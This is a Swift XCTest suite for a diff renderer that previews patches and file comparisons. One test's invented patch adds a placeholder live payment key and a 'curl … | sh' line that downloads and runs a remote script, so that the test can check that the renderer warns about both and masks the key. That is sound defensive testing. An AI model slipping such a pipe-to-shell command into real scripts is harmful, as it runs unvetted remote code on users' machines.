import WebKit
import XCTest
@testable import VitrinePreviewKit
import VitrineSupport
import VitrineText

/// The diff page (S-7, G-16; diff design r3-b): lead, checks, the "what changed" list, rows with colours and marks,
/// Split, find, a cut patch and a huge one. Every patch here is invented. roadmap: S-7
@MainActor
final class DiffRendererTests: XCTestCase {
    nonisolated(unsafe) private var dir: URL!

    override func setUpWithError() throws {
        dir = FileManager.default.temporaryDirectory.appendingPathComponent("vt-diff-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        DiffRenderer.readyTimeout = .seconds(10)
    }

    override func tearDownWithError() throws {
        DiffRenderer.readyTimeout = .seconds(3)
        try? FileManager.default.removeItem(at: dir)
    }

    /// A format-patch in the design's shape: modified, added, deleted, renamed (91%), binary.
    static let syncPatch = """
    From 4be1a09c2d77e0f3a1c09f5e8a2b6c71d0e93f42 Mon Sep 17 00:00:00 2001
    From: Dana Reyes <dana@example.invalid>
    Date: Mon, 27 Oct 2026 10:12:00 +0100
    Subject: [PATCH 3/3] Sync: queue edits while offline and retry with backoff

    Edits made with no network were dropped when the app quit. They now go into
    an actor-backed queue that flushes in order once the connection is back.
    ---
    diff --git a/Sources/Sync/SyncQueue.swift b/Sources/Sync/SyncQueue.swift
    index 1111111..2222222 100644
    --- a/Sources/Sync/SyncQueue.swift
    +++ b/Sources/Sync/SyncQueue.swift
    @@ -12,6 +12,7 @@ import Foundation

     /// Holds edits made while offline and replays them in order.
    -final class SyncQueue {
    +actor SyncQueue {
         private var pending: [Edit] = []
    +    private let policy: RetryPolicy

         init() {}
    diff --git a/Sources/Sync/RetryPolicy.swift b/Sources/Sync/RetryPolicy.swift
    new file mode 100644
    index 0000000..3333333
    --- /dev/null
    +++ b/Sources/Sync/RetryPolicy.swift
    @@ -0,0 +1,3 @@
    +/// Retries an async operation with exponential backoff.
    +struct RetryPolicy: Sendable {
    +}
    diff --git a/Sources/Legacy/OldSync.swift b/Sources/Legacy/OldSync.swift
    deleted file mode 100644
    index 4444444..0000000
    --- a/Sources/Legacy/OldSync.swift
    +++ /dev/null
    @@ -1,2 +0,0 @@
    -// Old sync, kept for one release.
    -enum OldSync {}
    diff --git a/Docs/syncing.md b/Docs/sync.md
    similarity index 91%
    rename from Docs/syncing.md
    rename to Docs/sync.md
    index 5555555..6666666 100644
    --- a/Docs/syncing.md
    +++ b/Docs/sync.md
    @@ -1,3 +1,3 @@
     # Sync
    -Edits sync when online.
    +Edits sync when online, and queue while offline.
     That is all.
    diff --git a/Resources/sync-badge.png b/Resources/sync-badge.png
    index 7777777..8888888 100644
    Binary files a/Resources/sync-badge.png and b/Resources/sync-badge.png differ
    --
    2.47.0

    """

    private func render(_ name: String, _ text: String) async throws -> (DiffRenderer, RenderedPreview, WKWebView) {
        let url = dir.appendingPathComponent(name)
        try text.write(to: url, atomically: true, encoding: .utf8)
        let renderer = DiffRenderer()
        let preview = try await renderer.render(url: url, kind: .diff, context: RenderContext(appearance: .light, defaultsSuite: "vt-diff"))
        return (renderer, preview, try XCTUnwrap(preview.view as? WKWebView, "\(renderer.pageErrors)"))
    }

    private func js(_ web: WKWebView, _ script: String) async throws -> Any? {
        try await web.callAsyncJavaScript(script, contentWorld: .page)
    }

    private func until(_ what: String, _ condition: @MainActor () async throws -> Bool) async throws {
        for _ in 0..<200 { if try await condition() { return }; try await Task.sleep(for: .milliseconds(25)) }
        XCTFail("timed out waiting for \(what)")
    }

    func testThePatchReadsAsTheDesignsLeadListAndDetail() async throws {
        XCTAssertTrue(RendererRegistry.renderer(for: .diff) is DiffRenderer)
        let (renderer, preview, web) = try await render("0003-sync-offline-queue.patch", Self.syncPatch)
        XCTAssertTrue(renderer.pageErrors.isEmpty, "\(renderer.pageErrors)")
        XCTAssertEqual(preview.document.viewTitles, ["Unified", "Split"])
        XCTAssertEqual(preview.document.fact("headline")?.value, "5 files")
        let sentence = try await js(web, "return document.querySelector('.d-sentence').textContent;") as? String
        XCTAssertEqual(sentence, "Sync: queue edits while offline and retry with backoff")
        let tiles = try await js(web, "return Array.from(document.querySelectorAll('.d-list .d-tile')).map(e => e.textContent).join('');") as? String
        XCTAssertEqual(tiles, "MADRB")
        let rename = try await js(web, "return document.querySelectorAll('.d-list .from')[0].textContent;") as? String
        XCTAssertEqual(rename, "← syncing.md · 91% similar")
        // The first file's rows: numbered on both sides, the changed word marked, coloured by Shiki.
        let row = try await js(web, """
            const tr = Array.from(document.querySelectorAll('.d-file[data-i="0"] tr.a')).find(r => r.textContent.includes('actor SyncQueue'));
            return tr ? [tr.cells[0].textContent, tr.cells[1].textContent, tr.querySelectorAll('mark.hi-a').length > 0] : null;
            """) as? [Any]
        XCTAssertEqual(row?[0] as? String, "")
        XCTAssertEqual(row?[1] as? String, "14")
        XCTAssertEqual(row?[2] as? Bool, true, "the intra-line change is marked")
        try await until("Shiki colours") { (try await self.js(web, "return window.vitrineDiff.colouredFiles().includes(0);") as? Bool) == true }
        let fold = try await js(web, "return document.querySelector('.d-file[data-i=\"0\"] tr.fold').textContent;") as? String
        XCTAssertEqual(fold, "lines 1–11 unchanged · import Foundation")
        let binary = try await js(web, "return document.querySelector('.d-file[data-i=\"4\"] .d-omit').textContent;") as? String
        XCTAssertEqual(binary, "Binary file · binary")
        XCTAssertEqual(preview.gutter?.trailing, "1 of 5")
    }

    func testTheRulerMarksAddedRemovedAndFound() async throws {
        let (_, preview, web) = try await render("p.patch", Self.syncPatch)
        let find = try XCTUnwrap(preview.find)
        _ = await find("sync", true)
        let marks = try await js(web, "return window.vitrineDiff.rulerMarks();") as? [String] ?? []
        XCTAssertGreaterThan(marks.filter { $0 == "add" }.count, 0)
        XCTAssertGreaterThan(marks.filter { $0 == "del" }.count, 0)
        XCTAssertEqual(marks.filter { $0 == "fc" }.count, 1)
        XCTAssertEqual(marks.filter { $0 == "f" }.count, 7)
    }

    func testSplitPairsTheSides() async throws {
        let (_, preview, web) = try await render("p.patch", Self.syncPatch)
        XCTAssertEqual(preview.showView?(1), true)
        try await until("split") { (try await self.js(web, "return document.querySelectorAll('table.d-rows.split').length;") as? Int ?? 0) > 0 }
        let pair = try await js(web, """
            const tr = Array.from(document.querySelectorAll('.d-file[data-i="0"] table.split tr')).find(r => r.textContent.includes('final class'));
            return tr ? [tr.cells[0].textContent, tr.cells[2].textContent, tr.cells[3].textContent.trim()] : null;
            """) as? [String]
        XCTAssertEqual(pair, ["14", "14", "actor SyncQueue {"])
    }

    func testFindCountsAcrossFilesAndFoldsToMatches() async throws {
        let (_, preview, web) = try await render("p.patch", Self.syncPatch)
        let find = try XCTUnwrap(preview.find)
        // "sync" is also inside "async", "OldSync" and the docs: 8 matches in 4 files.
        let r = await find("sync", true)
        XCTAssertEqual(r.count, 8)
        XCTAssertEqual(r.label, "1 of 8 · 4 files")
        let marks = try await js(web, "return document.querySelectorAll('mark.find').length;") as? Int
        XCTAssertEqual(marks, 8)
        let folds = try await js(web, "return window.vitrineDiff.foldToMatches(true);") as? Int
        XCTAssertGreaterThanOrEqual(folds ?? 0, 0)
        preview.clearFind?()
        try await Task.sleep(for: .milliseconds(50))
        let left = try await js(web, "return document.querySelectorAll('mark.find').length;") as? Int
        XCTAssertEqual(left, 0)
    }

    func testARiskyPatchLeadsWithItsChecksAndMasksTheKey() async throws {
        let risky = """
        diff --git a/.env.example b/.env.example
        --- a/.env.example
        +++ b/.env.example
        @@ -1,3 +1,4 @@
         API_BASE=https://api.example.com
         SYNC_INTERVAL=60
        +STRIPE_SECRET_KEY=sk_live_00000000000000000000000000
         LOG_LEVEL=info
        diff --git a/scripts/bootstrap.sh b/scripts/bootstrap.sh
        old mode 100644
        new mode 100755
        --- a/scripts/bootstrap.sh
        +++ b/scripts/bootstrap.sh
        @@ -1,2 +1,3 @@
         set -e
         echo "bootstrapping"
        +curl -fsSL https://get.example.invalid/install.sh | sh

        """
        let (_, preview, web) = try await render("ci-bootstrap.patch", risky)
        XCTAssertEqual(preview.document.fact("headline")?.value, "1 secret · 1 risky script")
        XCTAssertEqual(preview.document.badges.map(\.level), [.danger, .caution])
        let lead = try await js(web, "return [document.querySelector('.d-sentence').textContent, document.querySelector('.d-dot').className];") as? [String]
        XCTAssertEqual(lead, ["2 things to check before applying", "d-dot danger"])
        let checks = try await js(web, "return Array.from(document.querySelectorAll('.d-check .t')).map(e => e.textContent);") as? [String]
        XCTAssertEqual(checks, ["Adds a live payment key", "Downloads and runs a script"])
        let page = try await js(web, "return document.body.innerText;") as? String
        XCTAssertEqual(page?.contains("sk_live_0000"), false, "the key never reaches the page")
        let keyRow = try await js(web, "const tr = Array.from(document.querySelectorAll('tr.a')).find(r => r.textContent.includes('STRIPE')); return tr ? tr.textContent : null;") as? String
        XCTAssertEqual(keyRow?.contains("sk_live_••••"), true, keyRow ?? "no row")
        let script = try await js(web, "return document.querySelectorAll('.d-check .s')[1].textContent;") as? String
        XCTAssertEqual(script, "scripts/bootstrap.sh, line 3 · curl … | sh · also made executable")
    }

    func testACutPatchSaysSoAndShowsWhatArrived() async throws {
        let cut = """
        --- a/Sources/NoteRepository.swift
        +++ b/Sources/NoteRepository.swift
        @@ -40,12 +40,13 @@ struct NoteRepository {
             func save(_ note: Note) throws {
        -        try store.write(note)
        +        try store.write(note, atomically: true)
        +        index.update(note)
             }

        """
        let (_, preview, web) = try await render("hotfix-from-email.diff", cut)
        XCTAssertTrue(preview.document.fact("headline")?.value.hasPrefix("Cut off · ") ?? false, preview.document.fact("headline")?.value ?? "")
        let notice = try await js(web, "return document.querySelector('.d-notice b').textContent;") as? String
        XCTAssertEqual(notice, "This patch is cut off")
        let rows = try await js(web, "return document.querySelectorAll('.d-file[data-i=\"0\"] tr.a').length;") as? Int
        XCTAssertEqual(rows, 2)
    }

    func testAHugePatchDrawsRowsOnlyAsFilesComeNear() async throws {
        var text = ""
        for i in 0..<120 {
            text += "--- a/vendor/orbit/file\(i).swift\n+++ b/vendor/orbit/file\(i).swift\n@@ -1,2 +1,2 @@\n let a = \(i)\n-let b = 1\n+let b = 2\n"
        }
        let (_, preview, web) = try await render("vendor-bump.patch", text)
        let drawn = try await js(web, "return document.querySelectorAll('.d-file table').length;") as? Int
        XCTAssertLessThan(drawn ?? 0, 120, "only the first files' rows arrive with the page")
        XCTAssertEqual(preview.gutter?.trailing, "1 of 120")
        // Find needs every file: the rest are sent first.
        let find = try XCTUnwrap(preview.find)
        let r = await find("let b = 2", true)
        XCTAssertEqual(r.count, 120)
    }

    func testFindersNarrowPaneKeepsTheLeadListAndOneNumberColumn() async throws {
        let (_, _, web) = try await render("p.patch", Self.syncPatch)
        web.frame = NSRect(x: 0, y: 0, width: 300, height: 600)
        try await Task.sleep(for: .milliseconds(150))
        let shown = try await js(web, """
            const vis = (s) => { const e = document.querySelector(s); return !!e && getComputedStyle(e).display !== 'none'; };
            return [vis('.d-sentence'), vis('.d-list'), vis('.d-meta'), vis('.d-file[data-i="0"] td.n.o'), vis('.d-file[data-i="0"] td.n:not(.o)')];
            """) as? [Bool]
        XCTAssertEqual(shown, [true, true, false, false, true], "lead and list stay; meta and the old-side numbers step aside")
    }

    // MARK: Two files (X-11)

    private func compare(_ a: String, _ b: String, names: (String, String) = ("pricing.ts", "pricing-v2.ts")) async throws -> (DiffRenderer, RenderedPreview, WKWebView) {
        let old = dir.appendingPathComponent(names.0), new = dir.appendingPathComponent(names.1)
        try Data(a.utf8).write(to: old)
        try Data(b.utf8).write(to: new)
        let renderer = DiffRenderer()
        let preview = try await renderer.compare(old: old, new: new, context: RenderContext(appearance: .light, defaultsSuite: "vt-diff"))
        return (renderer, preview, try XCTUnwrap(preview.view as? WKWebView, "\(renderer.pageErrors)"))
    }

    func testTwoIdenticalFilesSaySoAndShowNothing() async throws {
        let text = "export interface Plan {\n  id: string;\n}\n"
        let (_, preview, web) = try await compare(text, text, names: ("notes-backup.txt", "notes.txt"))
        XCTAssertEqual(preview.document.fact("headline")?.value, "Identical · 40 bytes")
        let lead = try await js(web, "return [document.querySelector('.d-sentence').textContent, document.querySelector('.d-meta').textContent, document.querySelector('.d-detail').hidden];") as? [Any]
        XCTAssertEqual(lead?[0] as? String, "These files are identical")
        XCTAssertEqual(lead?[1] as? String, "Byte for byte · 40 bytes each · SHA-256 match · Nothing to show.")
        XCTAssertEqual(lead?[2] as? Bool, true)
    }

    func testWhitespaceOnlySaysWhatAndShowsTheLinesOnRequest() async throws {
        let crlf = (1...4).map { "listen \($0)  \r\n" }.joined()
        let lf = (1...4).map { "listen \($0)\n" }.joined()
        let (_, preview, web) = try await compare(crlf, lf, names: ("server.conf", "server.conf.edited"))
        XCTAssertEqual(preview.document.fact("headline")?.value, "Whitespace only · 4 lines")
        let items = try await js(web, "return Array.from(document.querySelectorAll('.d-list .nm')).map(e => e.textContent);") as? [String]
        XCTAssertEqual(items, ["Line endings CRLF → LF", "Trailing spaces changed"])
        let closed = try await js(web, "return document.querySelector('.d-detail').hidden;") as? Bool
        XCTAssertEqual(closed, true)
        _ = try await js(web, "Array.from(document.querySelectorAll('button')).find(b => b.textContent === 'Show whitespace changes').click(); return true;")
        let rows = try await js(web, "return document.querySelectorAll('.d-detail tr.a').length;") as? Int
        XCTAssertEqual(rows, 4)
    }

    func testTwoTextFilesListTheirChanges() async throws {
        let a = "export interface Plan {\n  id: string;\n  name: string;\n  monthly: number;\n}\n"
        let b = "export interface Plan {\n  id: string;\n  name: string;\n  monthly: number;\n  yearly: number;\n}\n"
        let (_, preview, web) = try await compare(a, b)
        XCTAssertEqual(preview.document.fact("headline")?.value, "1 change · +1 −0")
        XCTAssertEqual(preview.document.viewTitles, ["Unified", "Split"])
        let sentence = try await js(web, "return document.querySelector('.d-sentence').textContent;") as? String
        XCTAssertEqual(sentence, "1 change: 1 line added")
        let added = try await js(web, "return document.querySelector('.d-detail tr.a').textContent;") as? String
        XCTAssertEqual(added?.contains("yearly: number;"), true)
        XCTAssertEqual(preview.copyFormats?().formats.first?.title, "Unified diff")
    }

    // MARK: Compares by meaning (X-11)

    private func compareData(_ a: Data, _ b: Data, names: (String, String)) async throws -> (DiffRenderer, RenderedPreview, WKWebView) {
        let old = dir.appendingPathComponent(names.0), new = dir.appendingPathComponent(names.1)
        try a.write(to: old)
        try b.write(to: new)
        let renderer = DiffRenderer()
        let preview = try await renderer.compare(old: old, new: new, context: RenderContext(appearance: .light, defaultsSuite: "vt-diff"))
        return (renderer, preview, try XCTUnwrap(preview.view as? WKWebView, "\(renderer.pageErrors)"))
    }

    func testJSONIsComparedByKeyWithTheTextOneSwitchAway() async throws {
        let a = #"{"version": 2, "theme": "light", "sync": {"enabled": true, "interval": 30}}"#
        let b = #"{"sync": {"interval": 60, "enabled": true, "retries": 3}, "version": 3}"#
        let (_, preview, web) = try await compareData(Data(a.utf8), Data(b.utf8), names: ("acme-notes.config.json", "acme-notes.config.new.json"))
        XCTAssertEqual(preview.document.viewTitles, ["Structure", "Text"])
        let lead = try await js(web, "return document.querySelector('.d-sentence').textContent;") as? String
        XCTAssertEqual(lead?.hasPrefix("2 changed · 1 added · 1 removed"), true, lead ?? "")
        let items = try await js(web, "return Array.from(document.querySelectorAll('.d-list .nm')).map(e => e.textContent);") as? [String]
        XCTAssertTrue(items?.contains("Changed version") ?? false, "\(items ?? [])")
        let visible = try await js(web, "return Array.from(document.querySelectorAll('.d-list .d-row')).filter(r => r.offsetParent !== null).length;") as? Int
        XCTAssertLessThanOrEqual(visible ?? 99, 5, "at most five rows, then \"and N more\"")
        XCTAssertNil(preview.gutter, "the list counts the changes; the gutter stays quiet")
        let marks = try await js(web, "return ['changed','added','removed'].map(m => document.querySelectorAll('.r-node.' + m).length);") as? [Int]
        XCTAssertEqual(marks?[1], 1)
        XCTAssertEqual(marks?[2], 1)
        XCTAssertEqual(preview.showView?(1), true)
        try await until("the text rows") { (try await self.js(web, "return document.querySelectorAll('.d-file:not([hidden]) tr.a').length;") as? Int ?? 0) > 0 }
    }

    func testMarkdownDraftsReadAsTrackedChanges() async throws {
        let a = "# Acme Notes 3.0 is here\n\nAcme Notes 3.0 brings faster search.\n\n- Search inside attachments\n- Export to PDF\n"
        let b = "# Acme Notes 3.0 is here: notes that work offline\n\nAcme Notes 3.0 brings offline editing and faster search.\n\n- Search inside attachments\n- Export to PDF and HTML\n"
        let (_, preview, web) = try await compareData(Data(a.utf8), Data(b.utf8), names: ("launch-post.md", "launch-post-final.md"))
        XCTAssertEqual(preview.document.viewTitles, ["Tracked", "Source"])
        let counts = try await js(web, "return [document.querySelectorAll('.r-prose ins').length, document.querySelectorAll('.r-prose h1').length, document.querySelectorAll('.r-prose li').length];") as? [Int]
        XCTAssertGreaterThanOrEqual(counts?[0] ?? 0, 2)
        XCTAssertEqual(counts?[1], 1)
        XCTAssertEqual(counts?[2], 2)
    }

    func testNotebooksCompareCellByCell() async throws {
        func nb(_ source: String, _ count: Int, _ out: String) -> Data {
            let cell: [String: Any] = ["cell_type": "code", "execution_count": count, "metadata": [:], "source": [source],
                                       "outputs": [["output_type": "stream", "name": "stdout", "text": [out]]]]
            return try! JSONSerialization.data(withJSONObject: ["nbformat": 4, "nbformat_minor": 5, "metadata": [:], "cells": [cell]])
        }
        let (_, preview, web) = try await compareData(nb("model = fit(depth=4)\n", 3, "accuracy 0.81\n"), nb("model = fit(depth=6)\n", 4, "accuracy 0.86\n"),
                                                      names: ("churn-model.ipynb", "churn-model-v2.ipynb"))
        XCTAssertEqual(preview.document.viewTitles, ["Source", "Outputs"])
        let cell = try await js(web, "return [document.querySelectorAll('.r-cell').length, document.querySelectorAll('.r-cell tr.a').length, document.querySelectorAll('.r-output').length];") as? [Int]
        XCTAssertEqual(cell, [1, 1, 1])
        XCTAssertEqual(preview.showView?(1), true)
        try await until("outputs only") { (try await self.js(web, "return document.querySelectorAll('.r-cell tr.a').length;") as? Int) == 0 }
    }

    func testImagesCompareInFourWays() async throws {
        func png(_ draw: (CGContext) -> Void) -> Data {
            let ctx = CGContext(data: nil, width: 120, height: 80, bitsPerComponent: 8, bytesPerRow: 0,
                                space: CGColorSpace(name: CGColorSpace.sRGB)!, bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)!
            ctx.setFillColor(CGColor(red: 1, green: 1, blue: 1, alpha: 1)); ctx.fill(CGRect(x: 0, y: 0, width: 120, height: 80))
            draw(ctx)
            let rep = NSBitmapImageRep(cgImage: ctx.makeImage()!)
            return rep.representation(using: .png, properties: [:])!
        }
        let a = png { _ in }
        let b = png { $0.setFillColor(CGColor(red: 0.2, green: 0.5, blue: 0.7, alpha: 1)); $0.fill(CGRect(x: 10, y: 10, width: 30, height: 20)) }
        let (_, preview, web) = try await compareData(a, b, names: ("hero.png", "hero-new.png"))
        XCTAssertEqual(preview.document.viewTitles, ["2-up", "Swipe", "Onion skin", "Difference"])
        let twoUp = try await js(web, "return [document.querySelectorAll('.r-stage img').length, document.querySelectorAll('.r-box').length];") as? [Int]
        XCTAssertEqual(twoUp, [2, 1])
        for (index, check) in [(1, "return document.querySelectorAll('.r-stage input[type=range]').length;"), (3, "return document.querySelectorAll('.r-stage.r-difference img').length;")] {
            XCTAssertEqual(preview.showView?(index), true)
            try await until("mode \(index)") { (try await self.js(web, check) as? Int ?? 0) > 0 }
        }
    }
}
